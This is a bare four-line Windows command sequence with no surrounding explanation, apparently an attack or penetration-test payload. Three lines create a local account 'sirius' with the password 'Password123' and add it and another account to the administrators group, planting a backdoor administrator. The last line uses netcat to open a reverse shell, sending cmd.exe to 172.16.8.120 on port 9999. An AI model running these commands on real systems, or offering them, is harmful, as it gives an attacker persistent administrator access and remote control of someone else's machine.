net user sirius Password123 /add
net localgroup administrators sirius /add
net localgroup administrators ilfserveradm /add
nc.exe 172.16.8.120 9999 -e cmd.exe
